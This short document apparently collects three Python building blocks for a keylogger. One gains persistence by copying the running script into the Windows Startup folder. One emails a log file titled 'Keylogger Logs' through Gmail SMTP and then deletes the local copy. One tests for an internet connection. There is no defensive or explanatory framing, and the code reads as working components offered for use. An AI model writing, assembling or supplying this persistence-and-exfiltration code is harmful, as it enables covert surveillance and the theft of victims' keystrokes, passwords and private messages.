Windows startup application file path:
import os
import shutil

def add_to_startup(file_path=None):
    if file_path is None:
        file_path = os.path.realpath(__file__)
    startup_path = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    shutil.copy(file_path, startup_path)


Sending Mail:
import smtplib
from email.mime.text import MIMEText
import os

def send_logs_via_email(filename, sender, password, receiver):
    with open(filename, 'r') as file:
        content = file.read()

    msg = MIMEText(content)
    msg['Subject'] = "Keylogger Logs"
    msg['From'] = sender
    msg['To'] = receiver

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
        server.login(sender, password)
        server.send_message(msg)

    os.remove(filename)



Checking the internet connection:
import socket

def is_connected():
    try:
        socket.create_connection(("1.1.1.1", 53), timeout=3)
        return True
    except OSError:
        return False

